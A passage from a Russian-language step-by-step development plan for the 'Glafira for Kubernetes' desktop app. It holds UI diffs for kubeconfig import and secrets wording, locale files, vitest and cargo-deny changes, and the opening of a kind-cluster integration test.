   const dragged = useRef<TreeItemRef | null>(null);
 
   const connections = connectionsQ.data;
@@ -243,14 +246,26 @@ export function ConnectionTree() {
   const onImported = (result: ImportPreview) => {
     setImporting(null);
     const parts = [t("exchange.imported", { added: result.added.length, updated: result.updated.length })];
-    if (result.needsPasswords > 0) parts.push(t("exchange.passwordsNeeded", { count: result.needsPasswords }));
+    if (result.needsSecrets > 0) parts.push(t("exchange.secretsNeeded", { count: result.needsSecrets }));
     setNotice(parts.join(". "));
   };
 
+  const startKubeImport = (targetId: string | null) => {
+    setNotice(null);
+    setExchangeError(null);
+    setKubeImport({ targetId });
+  };
+
+  const onKubeImported = (saved: ConnectionProfile[]) => {
+    setKubeImport(null);
+    setNotice(t("kubeconfig.imported", { count: saved.length }));
+  };
+
   const headerMenuItems: FolderMenuItem[] = [
     { label: t("sidebar.newFolder"), onSelect: () => startCreate(null) },
     { label: t("sidebar.exportAll"), onSelect: () => void exportTree(null) },
     { label: t("sidebar.import"), onSelect: () => void startImport(null) },
+    { label: t("sidebar.importKubeconfig"), onSelect: () => startKubeImport(null) },
   ];
 
   const folderMenuItems = (folder: ConnectionFolder): FolderMenuItem[] => [
@@ -272,6 +287,7 @@ export function ConnectionTree() {
     },
     { label: t("sidebar.folder.export"), onSelect: () => void exportTree(folder) },
     { label: t("sidebar.folder.importHere"), onSelect: () => void startImport(folder.id) },
+    { label: t("sidebar.folder.importKubeconfigHere"), onSelect: () => startKubeImport(folder.id) },
   ];
 
   // --- Перетаскивание ---
@@ -522,6 +538,9 @@ export function ConnectionTree() {
       {importing && (
         <ImportDialog path={importing.path} initialTargetId={importing.targetId} onClose={() => setImporting(null)} onImported={onImported} />
       )}
+      {kubeImport && (
+        <KubeconfigImportDialog initialTargetId={kubeImport.targetId} onClose={() => setKubeImport(null)} onImported={onKubeImported} />
+      )}
     </>
   );
 }
````

<!-- block: patch t18-port-src-components-connections-tree-importdialog-test-tsx step=18.1 -->
````diff
diff --git a/src/components/connections/tree/ImportDialog.test.tsx b/src/components/connections/tree/ImportDialog.test.tsx
--- a/src/components/connections/tree/ImportDialog.test.tsx
+++ b/src/components/connections/tree/ImportDialog.test.tsx
@@ -28,9 +28,9 @@ const FOLDERS: ConnectionFolder[] = [
 const PREVIEW: ImportPreview = {
   added: [
     { kind: "folder", id: "f1", name: "Новая", path: [] },
-    { kind: "connection", id: "c1", name: "kafka-new", path: ["Новая"] },
+    { kind: "connection", id: "c1", name: "ocp-new", path: ["Новая"] },
   ],
-  updated: [{ kind: "connection", id: "c2", name: "kafka-upd", path: ["Проект А"] }],
+  updated: [{ kind: "connection", id: "c2", name: "ocp-upd", path: ["Проект А"] }],
   unchanged: [],
   skipped: [
     {
@@ -38,11 +38,11 @@ const PREVIEW: ImportPreview = {
       reason: { key: "errors.import.unsupportedConnection", params: { error: "oops" }, text: "Unsupported: oops" },
     },
   ],
-  warnings: [{ key: "warnings.import.missingFiles", params: { count: "2" }, text: "Certificate files of 2 connections are not found" }],
-  needsPasswords: 3,
+  warnings: [{ key: "errors.generic", params: { message: "Предупреждение из файла" }, text: "Warning from the file" }],
+  needsSecrets: 3,
 };
 
-const PATH = "/tmp/in.glafira-connections.json";
+const PATH = "/tmp/in.glafira-kubernetes-connections.json";
 
 beforeEach(() => {
   vi.clearAllMocks();
@@ -68,8 +68,8 @@ describe("ImportDialog", () => {
     expect(within(dialog).getByText("Обновятся (1)")).toBeInTheDocument();
     expect(within(dialog).getByText("Пропущены (1)")).toBeInTheDocument();
     expect(within(dialog).queryByText(/^Без изменений \(/)).not.toBeInTheDocument();
-    expect(within(dialog).getByText("Новая / kafka-new")).toBeInTheDocument();
-    expect(within(dialog).getByText("Проект А / kafka-upd")).toBeInTheDocument();
+    expect(within(dialog).getByText("Новая / ocp-new")).toBeInTheDocument();
+    expect(within(dialog).getByText("Проект А / ocp-upd")).toBeInTheDocument();
     expect(within(dialog).getByText(/broken/)).toHaveTextContent("oops");
   });
 
@@ -91,10 +91,10 @@ describe("ImportDialog", () => {
     expect(await screen.findByRole("combobox", { name: "Куда импортировать" })).toHaveValue("a");
   });
 
-  it("показывает предупреждения и строку о паролях", async () => {
+  it("показывает предупреждения и строку о секретах", async () => {
     renderDialog();
-    expect(await screen.findByText(/Файлы сертификатов 2 подключений не найдены/)).toBeInTheDocument();
-    expect(screen.getByText("После импорта введите пароли для 3 подключений")).toBeInTheDocument();
+    expect(await screen.findByText("Предупреждение из файла")).toBeInTheDocument();
+    expect(screen.getByText("После импорта введите токены или ключи для 3 подключений")).toBeInTheDocument();
   });
 
   it("«Импортировать» применяет импорт с теми же аргументами и закрывает диалог", async () => {
````

<!-- block: patch t18-port-src-components-connections-tree-importdialog-tsx step=18.1 -->
````diff
diff --git a/src/components/connections/tree/ImportDialog.tsx b/src/components/connections/tree/ImportDialog.tsx
--- a/src/components/connections/tree/ImportDialog.tsx
+++ b/src/components/connections/tree/ImportDialog.tsx
@@ -141,12 +141,12 @@ export function ImportDialog({ path, initialTargetId, onClose, onImported }: Pro
             <Group title={t("exchange.import.groupUpdated")} items={preview.updated.map(itemLabel)} />
             <Group title={t("exchange.import.groupUnchanged")} items={preview.unchanged.map(itemLabel)} />
             <Group title={t("exchange.import.groupSkipped")} items={preview.skipped.map((s) => `${s.name} — ${tr(s.reason)}`)} />
-            {(preview.warnings.length > 0 || preview.needsPasswords > 0) && (
+            {(preview.warnings.length > 0 || preview.needsSecrets > 0) && (
               <ul className="import-warnings">
                 {preview.warnings.map((w, i) => (
                   <li key={i}>{tr(w)}</li>
                 ))}
-                {preview.needsPasswords > 0 && <li>{t("exchange.import.passwords", { count: preview.needsPasswords })}</li>}
+                {preview.needsSecrets > 0 && <li>{t("exchange.import.secrets", { count: preview.needsSecrets })}</li>}
               </ul>
             )}
           </div>
````

<!-- block: patch t18-port-src-guide-nolookbehind-test-ts step=18.1 -->
````diff
diff --git a/src/guide/noLookbehind.test.ts b/src/guide/noLookbehind.test.ts
--- a/src/guide/noLookbehind.test.ts
+++ b/src/guide/noLookbehind.test.ts
@@ -9,7 +9,7 @@ const sources = import.meta.glob<string>(["../**/*.{ts,tsx}", "!../**/*.test.{ts
 
 describe("regular expressions", () => {
   it("use no lookbehind in app code", () => {
-    expect(Object.keys(sources).length).toBeGreaterThan(50);
+    expect(Object.keys(sources).length).toBeGreaterThan(40);
     const offenders = Object.entries(sources)
       .filter(([, text]) => /\(\?<[=!]/.test(text))
       .map(([path]) => path);
````

<!-- block: patch t18-port-src-lib-useappmenu-test-ts step=18.1 -->
````diff
diff --git a/src/lib/useAppMenu.test.ts b/src/lib/useAppMenu.test.ts
--- a/src/lib/useAppMenu.test.ts
+++ b/src/lib/useAppMenu.test.ts
@@ -99,7 +99,6 @@ vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));
 import { openUrl } from "@tauri-apps/plugin-opener";
 import { i18n } from "../i18n";
 import { SUPPORT_URL } from "./links";
-import { useDiagnosticsRequest } from "../state/diagnosticsRequest";
 import { useWorkspace } from "../state/workspace";
 import { useAppMenu } from "./useAppMenu";
 
@@ -123,7 +122,6 @@ beforeEach(() => {
   h.channels.clear();
   vi.mocked(openUrl).mockClear();
   useWorkspace.setState({ tabs: [], activeId: null });
-  useDiagnosticsRequest.setState({ pending: false });
 });
 
 afterEach(async () => {
@@ -148,7 +146,7 @@ describe("useAppMenu", () => {
     renderHook(() => useAppMenu());
     await waitFor(() => expect(helpSubmenu()).toBeDefined());
     expect(helpSubmenu()?.opts.text).toBe("Справка");
-    expect(labels()).toEqual(["Руководство Glafira", "Решение проблем", "—", "Поддержать проект", "О программе", "Собрать диагностику…"]);
+    expect(labels()).toEqual(["Руководство Glafira", "—", "Поддержать проект", "О программе"]);
     // Стандартное пустое Help из меню по умолчанию заменено нашим; остальные подменю на месте.
     expect(h.appMenu?.items.some((i) => i.opts.id === "__tauri_help_menu__")).toBe(false);
     expect(h.appMenu?.items.some((i) => i.opts.id === "__tauri_window_menu__")).toBe(true);
@@ -163,12 +161,12 @@ describe("useAppMenu", () => {
     await waitFor(() => expect(helpSubmenu()?.opts.text).toBe("Справка"));
     await act(() => i18n.changeLanguage("en"));
     await waitFor(() => expect(helpSubmenu()?.opts.text).toBe("Help"));
-    expect(labels()).toEqual(["Glafira Guide", "Troubleshooting", "—", "Support the project", "About Glafira", "Collect Diagnostics…"]);
+    expect(labels()).toEqual(["Glafira Guide", "—", "Support the project", "About Glafira"]);
     // Прежнее меню освобождено.
     expect(h.menus[0].closed).toBe(true);
   });
 
-  it("пункты открывают справку, решение проблем, «О программе» и сбор диагностики", async () => {
+  it("пункты открывают справку, «О программе» и страницу поддержки", async () => {
     setUA("Macintosh");
     renderHook(() => useAppMenu());
     await waitFor(() => expect(helpSubmenu()).toBeDefined());
@@ -176,20 +174,11 @@ describe("useAppMenu", () => {
     click("guide");
     expect(useWorkspace.getState().tabs).toEqual([{ id: "help", kind: "help" }]);
 
-    click("troubleshooting");
-    expect(useWorkspace.getState().tabs.find((t) => t.id === "help")).toMatchObject({ kind: "help", chapter: "troubleshooting" });
-
     click("about");
     expect(useWorkspace.getState().activeId).toBe("about");
-    expect(useDiagnosticsRequest.getState().pending).toBe(false);
 
     click("support");
     expect(openUrl).toHaveBeenCalledWith(SUPPORT_URL);
-
-    useWorkspace.setState({ tabs: [], activeId: null });
-    click("diagnostics");
-    expect(useWorkspace.getState().activeId).toBe("about");
-    expect(useDiagnosticsRequest.getState().pending).toBe(true);
   });
 
   it("хэндлы освобождаются: стандартный Help, прежнее меню из setAsAppMenu, пункты заменённого меню", async () => {
````

<!-- block: patch t18-port-src-lib-useappmenu-ts step=18.1 -->
````diff
diff --git a/src/lib/useAppMenu.ts b/src/lib/useAppMenu.ts
--- a/src/lib/useAppMenu.ts
+++ b/src/lib/useAppMenu.ts
@@ -2,7 +2,6 @@ import { useEffect } from "react";
 import { Menu, MenuItem, PredefinedMenuItem, Submenu } from "@tauri-apps/api/menu";
 import { i18n } from "../i18n";
 import { openSupport } from "./links";
-import { useDiagnosticsRequest } from "../state/diagnosticsRequest";
 import { useWorkspace } from "../state/workspace";
 
 /** id пустого подменю Help в меню Tauri по умолчанию (`tauri::menu::HELP_SUBMENU_ID`). */
@@ -45,22 +44,9 @@ async function buildAppMenu(): Promise<BuiltMenu> {
   const items = [
     // ⌘? — на раскладке US это ⇧⌘/; символ «?» как клавишу Tauri не принимает.
     await MenuItem.new({ id: id("guide"), text: t("menu.guide"), accelerator: "CmdOrCtrl+Shift+/", action: () => open({ kind: "help" }) }),
-    await MenuItem.new({
-      id: id("troubleshooting"),
-      text: t("menu.troubleshooting"),
-      action: () => open({ kind: "help", chapter: "troubleshooting" }),
-    }),
     await PredefinedMenuItem.new({ item: "Separator" }),
     await MenuItem.new({ id: id("support"), text: t("support.title"), action: openSupport }),
     await MenuItem.new({ id: id("about"), text: t("menu.about"), action: () => open({ kind: "about" }) }),
-    await MenuItem.new({
-      id: id("diagnostics"),
-      text: t("menu.diagnostics"),
-      action: () => {
-        useDiagnosticsRequest.getState().request();
-        open({ kind: "about" });
-      },
-    }),
   ];
   const help = await Submenu.new({ id: id("glafira-help"), text: t("menu.help"), items });
   await menu.append(help);
````

Применить: `python3 /tmp/o1a-blocks.py step 18.1`.

- [ ] **Step 2: Тесты.**

<!-- block: file t18-src-components-sidebar-test-tsx step=18.2 path=src/components/Sidebar.test.tsx -->
````tsx
import { screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import { renderWithClient } from "../test/render";
import { newProfile } from "./connections/profile";

vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));
vi.mock("../api/client", async (importOriginal) => {
  const orig = await importOriginal<typeof import("../api/client")>();
  return {
    ...orig,
    api: {
      listConnections: vi.fn().mockResolvedValue([{ ...newProfile(), id: "c", name: "local" }]),
      listFolders: vi.fn().mockResolvedValue([]),
    },
  };
});

import { openUrl } from "@tauri-apps/plugin-opener";
import { SUPPORT_URL } from "../lib/links";
import { Sidebar } from "./Sidebar";

describe("Sidebar", () => {
  it("внизу панели — «Поддержать проект», открывает страницу поддержки; ссылки «Лицензия» нет", async () => {
    const user = userEvent.setup();
    const { container } = renderWithClient(<Sidebar />);
    expect(await screen.findByRole("button", { name: "Обзор" })).toBeEnabled();
    const footer = [...container.querySelectorAll<HTMLButtonElement>(".sidebar-footer button")].map((b) => b.textContent);
    expect(footer).toEqual(["Настройки", "Поддержать проект", "Справка", "О программе"]);
    const links = screen.getAllByRole("button").map((b) => b.textContent);
    expect(links.some((l) => l?.startsWith("Лицензия"))).toBe(false);
    await user.click(screen.getByRole("button", { name: "Поддержать проект" }));
    expect(openUrl).toHaveBeenCalledWith(SUPPORT_URL);
  });
});
````

<!-- block: patch t18-tests step=18.2 -->
````diff
diff --git a/src/App.test.tsx b/src/App.test.tsx
--- a/src/App.test.tsx
+++ b/src/App.test.tsx
@@ -1,13 +1,22 @@
 import { render, screen } from "@testing-library/react";
 import { vi } from "vitest";
 
-vi.mock("./api/client", () => ({
-  api: { getLanguageSettings: vi.fn(() => new Promise(() => {})) },
-}));
+vi.mock("./api/client", async (importOriginal) => {
+  const orig = await importOriginal<typeof import("./api/client")>();
+  return {
+    ...orig,
+    api: {
+      getLanguageSettings: vi.fn(() => new Promise(() => {})),
+      listConnections: vi.fn().mockResolvedValue([]),
+      listFolders: vi.fn().mockResolvedValue([]),
+    },
+  };
+});
 
 import App from "./App";
 
-test("показывает имя продукта", () => {
+test("пустое окно предлагает добавить подключение", async () => {
   render(<App />);
-  expect(screen.getByText("Glafira for Kubernetes")).toBeInTheDocument();
+  expect(await screen.findByText(/Добавьте первое подключение/)).toBeInTheDocument();
+  expect(screen.getByText("Выберите подключение слева или добавьте новое.")).toBeInTheDocument();
 });
````

Применить: `python3 /tmp/o1a-blocks.py step 18.2`.

- [ ] **Step 3: Увидеть падение.**

Run: `pnpm vitest run src/components/Sidebar.test.tsx`
Expected: FAIL — нет модулей или компонентов, которые проверяют тесты.

- [ ] **Step 4: Реализация.**

<!-- block: file t18-src-components-tabcontent-tsx step=18.4 path=src/components/TabContent.tsx -->
````tsx
import { Component, lazy, type ReactNode, Suspense } from "react";
import { useTranslation } from "react-i18next";
import type { Tab } from "../state/workspace";
import { AboutPanel } from "./about/AboutPanel";
import { ConnectionPanel } from "./cluster/ConnectionPanel";
import { ConnectionFormTab } from "./connections/ConnectionFormTab";
import { SettingsPanel } from "./settings/SettingsPanel";

// Справка (react-markdown и главы) грузится отдельным чанком при первом открытии.
const HelpPanel = lazy(() => import("./help/HelpPanel").then((m) => ({ default: m.HelpPanel })));

/** Сбой чанка или рендера справки показывает «Не удалось загрузить руководство», не роняя окно. */
class HelpBoundary extends Component<{ fallback: ReactNode; children: ReactNode }, { failed: boolean }> {
  state = { failed: false };
  static getDerivedStateFromError() {
    return { failed: true };
  }
  render() {
    return this.state.failed ? this.props.fallback : this.props.children;
  }
}

function LazyHelp({ tab }: { tab: Extract<Tab, { kind: "help" }> }) {
  const { t } = useTranslation();
  return (
    <HelpBoundary fallback={<p className="empty">{t("help.loadFailed")}</p>}>
      <Suspense fallback={<p className="empty">{t("common.loading")}</p>}>
        <HelpPanel spec={tab} />
      </Suspense>
    </HelpBoundary>
  );
}

export function TabContent({ tab }: { tab: Tab }) {
  switch (tab.kind) {
    case "about":
      return <AboutPanel />;
    case "help":
      return <LazyHelp tab={tab} />;
    case "settings":
      return <SettingsPanel />;
    case "connection-form":
      return <ConnectionFormTab connectionId={tab.connectionId} folderId={tab.folderId ?? null} tabId={tab.id} />;
    case "cluster":
      return <ConnectionPanel connectionId={tab.connectionId} />;
  }
}
````

<!-- block: file t18-src-components-connections-tree-connectionnode-tsx step=18.4 path=src/components/connections/tree/ConnectionNode.tsx -->
````tsx
import type { HTMLAttributes } from "react";
import { useTranslation } from "react-i18next";
import type { ConnectionProfile } from "../../../api/types";
import { useWorkspace } from "../../../state/workspace";
import { EnvBadge } from "../../common/EnvBadge";

/**
 * Узел подключения в дереве: точка цвета, имя, окружение и пункты подключения
 * (этап O1b добавит «Проекты» и «Ноды»). rowProps — атрибуты строки (перетаскивание).
 */
export function ConnectionNode({ connection: c, rowProps }: { connection: ConnectionProfile; rowProps?: HTMLAttributes<HTMLDivElement> }) {
  const { t } = useTranslation();
  const open = useWorkspace((s) => s.open);

  return (
    <li>
      <div {...rowProps} className={rowProps?.className ? `tree-conn ${rowProps.className}` : "tree-conn"}>
        <span className="dot" style={{ background: c.color }} />
        <span className="tree-name">{c.name}</span>
        <EnvBadge environment={c.environment} readOnly={c.readOnly} />
        <button type="button" className="icon" title={t("sidebar.editConnection")} onClick={() => open({ kind: "connection-form", connectionId: c.id })}>
          ✎
        </button>
      </div>
      <ul>
        <li>
          <button type="button" className="link" onClick={() => open({ kind: "cluster", connectionId: c.id })}>
            {t("sidebar.cluster")}
          </button>
        </li>
      </ul>
    </li>
  );
}
````

<!-- block: patch t18-src step=18.4 -->
````diff
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -107,3 +107,19 @@
 | `scripts/guide-publish.mjs` | `scripts/guide-publish.mjs` | `8bbd0bd` | адаптирован: заголовок |
 | `scripts/guide-publish.test.mjs` | `scripts/guide-publish.test.mjs` | `8bbd0bd` | адаптирован: языки en и ru |
 | `scripts/guide-publish.d.mts` | `scripts/guide-publish.d.mts` | `8bbd0bd` | как есть |
+| `src/components/connections/tree/FolderMenu.tsx` | `src/components/connections/tree/FolderMenu.tsx` | `8bbd0bd` | как есть |
+| `src/components/connections/tree/ConnectionTree.tsx` | `src/components/connections/tree/ConnectionTree.tsx` | `8bbd0bd` | адаптирован: файл обмена Kubernetes, секреты, импорт kubeconfig |
+| `src/components/connections/tree/ConnectionTree.test.tsx` | `src/components/connections/tree/ConnectionTree.test.tsx` | `8bbd0bd` | адаптирован: пункты подключения, секреты, kubeconfig |
+| `src/components/connections/tree/ImportDialog.tsx` | `src/components/connections/tree/ImportDialog.tsx` | `8bbd0bd` | адаптирован: флаги секретов |
+| `src/components/connections/tree/ImportDialog.test.tsx` | `src/components/connections/tree/ImportDialog.test.tsx` | `8bbd0bd` | адаптирован: флаги секретов |
+| `src/components/connections/tree/ConnectionNode.tsx` | `src/components/connections/tree/ConnectionNode.tsx` | `8bbd0bd` | адаптирован: пункты Kubernetes O1 |
+| `src/lib/useHelpShortcut.ts` | `src/lib/useHelpShortcut.ts` | `8bbd0bd` | как есть |
+| `src/guide/noLookbehind.test.ts` | `src/guide/noLookbehind.test.ts` | `8bbd0bd` | адаптирован: порог числа файлов |
+| `src/components/TabContent.help.test.tsx` | `src/components/TabContent.help.test.tsx` | `8bbd0bd` | как есть |
+| `src/lib/useAppMenu.ts` | `src/lib/useAppMenu.ts` | `8bbd0bd` | адаптирован: без пунктов решения проблем и диагностики (O6) |
+| `src/lib/useAppMenu.test.ts` | `src/lib/useAppMenu.test.ts` | `8bbd0bd` | адаптирован: пункты меню O1 |
+| `src/components/Layout.tsx` | `src/components/Layout.tsx` | `8bbd0bd` | адаптирован: вкладки O1, без MCP и обновлений |
+| `src/components/Layout.test.tsx` | `src/components/Layout.test.tsx` | `8bbd0bd` | адаптирован: профиль Kubernetes, вкладки O1 |
+| `src/components/Sidebar.tsx` | `src/components/Sidebar.tsx` | `8bbd0bd` | адаптирован: без индикатора MCP |
+| `src/components/Sidebar.test.tsx` | `src/components/Sidebar.test.tsx` | `8bbd0bd` | адаптирован: пункты подключения O1 |
+| `src/components/TabContent.tsx` | `src/components/TabContent.tsx` | `8bbd0bd` | адаптирован: вкладки O1 |
diff --git a/src/App.tsx b/src/App.tsx
--- a/src/App.tsx
+++ b/src/App.tsx
@@ -1,4 +1,6 @@
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
+import { Layout } from "./components/Layout";
+import { useAppMenu } from "./lib/useAppMenu";
 import { useLanguageSync } from "./lib/useLanguageSync";
 
 function LanguageSync() {
@@ -6,6 +8,12 @@ function LanguageSync() {
   return null;
 }
 
+/** Меню Help на macOS (на других системах ничего не делает). */
+function AppMenu() {
+  useAppMenu();
+  return null;
+}
+
 // Без автоповтора: backend сам ждёт до таймаута и быстро отказывает при недоступном кластере,
 // а повтор удваивал бы ожидание. Повторить можно кнопкой в баннере ошибки.
 const queryClient = new QueryClient({
@@ -16,7 +24,8 @@ export default function App() {
   return (
     <QueryClientProvider client={queryClient}>
       <LanguageSync />
-      <main className="page">Glafira for Kubernetes</main>
+      <AppMenu />
+      <Layout />
     </QueryClientProvider>
   );
 }
````

<!-- block: locales t18-locales step=18.4 -->
````json
{
  "en": {
    "sidebar": {
      "connections": "Connections",
      "editConnection": "Edit connection",
      "emptyHint": "Add your first connection or import contexts from kubeconfig in the <code>⋯</code> menu.",
      "cluster": "Overview",
      "filter": "Filter connections",
      "folderToggle": "Expand or collapse {{name}}",
      "noMatches": "Nothing found",
      "menu": "More actions",
      "folder": {
        "newConnection": "New connection here",
        "rename": "Rename",
        "delete": "Delete",
        "deleteConfirm": "Delete folder “{{name}}”?",
        "namePlaceholder": "Folder name",
        "export": "Export folder…",
        "importHere": "Import here…",
        "importKubeconfigHere": "Import from kubeconfig here…"
      }
    },
    "tabs": {
      "settings": "Settings",
      "about": "About",
      "help": "Help",
      "connection": "Connection: {{name}}",
      "newConnection": "New connection",
      "cluster": "{{conn}} · Overview"
    },
    "layout": {
      "closeTab": "Close tab",
      "empty": "Select a connection on the left or add a new one."
    },
    "menu": {
      "help": "Help",
      "guide": "Glafira Guide",
      "about": "About Glafira"
    },
    "exchange": {
      "exported": "Saved: connections {{connections}}, folders {{folders}}",
      "imported": "Imported: added {{added}}, updated {{updated}}",
      "secretsNeeded_one": "Enter a token or key for {{count}} connection",
      "secretsNeeded_other": "Enter tokens or keys for {{count}} connections",
      "import": {
        "title": "Import connections",
        "target": "Import into",
        "updateExisting": "Update existing connections",
        "summary": "Added: {{added}} · Updated: {{updated}} · Unchanged: {{unchanged}} · Skipped: {{skipped}}",
        "groupAdded": "New",
        "groupUpdated": "Will be updated",
        "groupUnchanged": "Unchanged",
        "groupSkipped": "Skipped",
        "secrets_one": "Enter a token or key for {{count}} connection after import",
        "secrets_other": "Enter tokens or keys for {{count}} connections after import",
        "apply": "Import"
      }
    },
    "hints": {
      "import": {
        "target": "Where new folders and connections go. Existing ones stay where they are.",
        "updateExisting": "Connections that already exist get the settings from the file; your tokens, keys and their place in the tree are kept."
      }
    }
  },
  "ru": {
    "sidebar": {
      "connections": "Подключения",
      "editConnection": "Изменить подключение",
      "emptyHint": "Добавьте первое подключение или импортируйте контексты kubeconfig из меню <code>⋯</code>.",
      "cluster": "Обзор",
      "filter": "Фильтр подключений",
      "folderToggle": "Развернуть или свернуть {{name}}",
      "noMatches": "Ничего не найдено",
      "menu": "Ещё действия",
      "folder": {
        "newConnection": "Новое подключение здесь",
        "rename": "Переименовать",
        "delete": "Удалить",
        "deleteConfirm": "Удалить папку «{{name}}»?",
        "namePlaceholder": "Имя папки",
        "export": "Экспортировать папку…",
        "importHere": "Импортировать сюда…",
        "importKubeconfigHere": "Импорт из kubeconfig сюда…"
      }
    },
    "tabs": {
      "settings": "Настройки",
      "about": "О программе",
      "help": "Справка",
      "connection": "Подключение: {{name}}",
      "newConnection": "Новое подключение",
      "cluster": "{{conn}} · Обзор"
    },
    "layout": {
      "closeTab": "Закрыть вкладку",
      "empty": "Выберите подключение слева или добавьте новое."
    },
    "menu": {
      "help": "Справка",
      "guide": "Руководство Glafira",
      "about": "О программе"
    },
    "exchange": {
      "exported": "Сохранено: подключений {{connections}}, папок {{folders}}",
      "imported": "Импортировано: добавлено {{added}}, обновлено {{updated}}",
      "secretsNeeded_one": "Введите токен или ключ для {{count}} подключения",
      "secretsNeeded_few": "Введите токены или ключи для {{count}} подключений",
      "secretsNeeded_many": "Введите токены или ключи для {{count}} подключений",
      "secretsNeeded_other": "Введите токены или ключи для {{count}} подключения",
      "import": {
        "title": "Импорт подключений",
        "target": "Куда импортировать",
        "updateExisting": "Обновлять существующие подключения",
        "summary": "Добавится: {{added}} · Обновится: {{updated}} · Без изменений: {{unchanged}} · Пропущено: {{skipped}}",
        "groupAdded": "Новые",
        "groupUpdated": "Обновятся",
        "groupUnchanged": "Без изменений",
        "groupSkipped": "Пропущены",
        "secrets_one": "После импорта введите токен или ключ для {{count}} подключения",
        "secrets_few": "После импорта введите токены или ключи для {{count}} подключений",
        "secrets_many": "После импорта введите токены или ключи для {{count}} подключений",
        "secrets_other": "После импорта введите токены или ключи для {{count}} подключения",
        "apply": "Импортировать"
      }
    },
    "hints": {
      "import": {
        "target": "Куда попадут новые папки и подключения. Существующие останутся на своих местах.",
        "updateExisting": "Уже существующие подключения получат настройки из файла; ваши токены, ключи и их место в дереве сохранятся."
      }
    }
  }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 18.4`.

- [ ] **Step 5: Проверки.**

Run: `pnpm test`  
Expected: PASS — `Test Files 31 passed`, `Tests 177 passed`

Run: `pnpm exec tsc --noEmit`  
Expected: PASS — без ошибок

Run: `pnpm i18n:check`  
Expected: PASS — `✓ словари en, ru согласованы, вызовов из Rust: 126`

Run: `pnpm test:scripts`  
Expected: PASS — `# pass 54`, `# fail 0`

Run: `pnpm build`  
Expected: PASS — `✓ dist/assets: чанки совместимы с WebKit macOS 11+`

- [ ] **Step 6: Commit.**

```bash
git add -A
git commit -s -m "feat(ui): дерево подключений с папками, экспортом и импортом, раскладка, меню Help" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 19: Интеграционные тесты на kind и CI

**Files:**
- Port: `deny.toml` (с правками)
- Create: `.github/FUNDING.yml`, `.github/workflows/ci.yml`, `dev/kind/README.md`, `dev/kind/setup.sh`, `src-tauri/tests/it_connect.rs`
- Modify: `.gitignore`, `PORTED.md`

**Interfaces:**
- Consumes: задачи 4–12 через публичный API крейта (`glafira_kubernetes_lib::k8s::{connectivity, kubeconfig, pool}`, `platform`, `policy`, `auth::exec`, `secrets`, `storage::profile`).
- Produces: `GO_IT_KUBECONFIG=<путь к dev/kind/out/kubeconfig>` для интеграционных тестов.

Спец. §17. `dev/kind/setup.sh` готовит кластер kind: проект `team-a`, сервисная учётная запись `glafira-dev` с ролью `edit` только в нём и kubeconfig с контекстами `admin` (сертификат kind) и `dev-token`. Интеграционные тесты `src-tauri/tests/it_connect.rs` импортируют контексты так же, как приложение, и проверяют все шаги проверки подключения, платформу `kubernetes` без групп OpenShift, сведения о подключении, права учётной записи, отказ неверного токена и вход exec-плагином (unix: скрипт с именем `kubectl` выдаёт токен учётной записи); без `GO_IT_KUBECONFIG` они пропускаются. CI: фронтенд, скрипты, i18n, сборка, fmt, clippy, `cargo deny` (лицензии и уязвимости), кластер kind (`helm/kind-action` v1.15.1, kind v0.33.0) и тесты Rust; на тегах — сборка и unit-тесты на macOS и Windows. Особенности OpenShift (OAuth, проекты, маршруты), настоящие OIDC- и облачные плагины kind не покрывает — их проверяет смоук (задача 20).

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: shell t19-port step=19.1 -->
````bash
scripts/port.sh deny.toml deny.toml
````

<!-- block: patch t19-port-deny-toml step=19.1 -->
````diff
diff --git a/deny.toml b/deny.toml
--- a/deny.toml
+++ b/deny.toml
@@ -1,8 +1,7 @@
-# Лицензии зависимостей: `cargo deny --manifest-path <крейт>/Cargo.toml --config deny.toml check licenses`
-# для src-tauri и crates/glafira-mcp (так же в CI). Белый список — только разрешительные лицензии;
-# MPL-2.0 — копилефт на уровне файла, совместима, пока файлы этих крейтов не изменяются.
-# C-библиотеки, которые собирают rdkafka-sys (librdkafka, zstd, zlib, lz4) и openssl-src (OpenSSL 3,
-# feature ssl-vendored), cargo deny не видит — они перечислены в THIRD_PARTY.md вручную.
+# Лицензии зависимостей: `cargo deny --manifest-path src-tauri/Cargo.toml --config deny.toml check licenses`
+# (так же в CI). Белый список — только разрешительные лицензии; MPL-2.0 — копилефт на уровне файла,
+# совместима, пока файлы этих крейтов не изменяются. TLS — rustls с провайдером ring (C и ассемблер ring
+# собираются из исходников крейта и покрыты его лицензией).
 [licenses]
 confidence-threshold = 0.8
 unused-allowed-license = "allow"
````

Применить: `python3 /tmp/o1a-blocks.py step 19.1`.

- [ ] **Step 2: Тесты.**

<!-- block: file t19-src-tauri-tests-it-connect-rs step=19.2 path=src-tauri/tests/it_connect.rs -->
````rust
//! Интеграция с настоящим API-сервером (kind, `dev/kind/setup.sh`). Нужен `GO_IT_KUBECONFIG` —
//! kubeconfig с контекстами `admin` и `dev-token`; без переменной тесты пропускаются.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use glafira_kubernetes_lib::error::ErrorCode;
use glafira_kubernetes_lib::k8s::{connectivity, kubeconfig, pool};
use glafira_kubernetes_lib::platform::PlatformKind;
use glafira_kubernetes_lib::policy::PolicyStatus;
use glafira_kubernetes_lib::secrets::{CLIENT_KEY, MemoryStore, SecretStore, TOKEN, secret_key};
use glafira_kubernetes_lib::storage::profile::ConnectionProfile;
use tokio::sync::oneshot;

/// Сигнал отмены, который не срабатывает (отправитель живёт до конца теста).
fn no_cancel() -> oneshot::Receiver<()> {
    let (tx, rx) = oneshot::channel();
    std::mem::forget(tx);
    rx
}

async fn test(p: &ConnectionProfile, secrets: Arc<MemoryStore>) -> connectivity::TestReport {
    connectivity::test_connection(p, secrets, &PolicyStatus::default(), no_cancel()).await
}

fn kubeconfig_path() -> Option<PathBuf> {
    let p = std::env::var_os("GO_IT_KUBECONFIG").map(PathBuf::from);
    if p.is_none() {
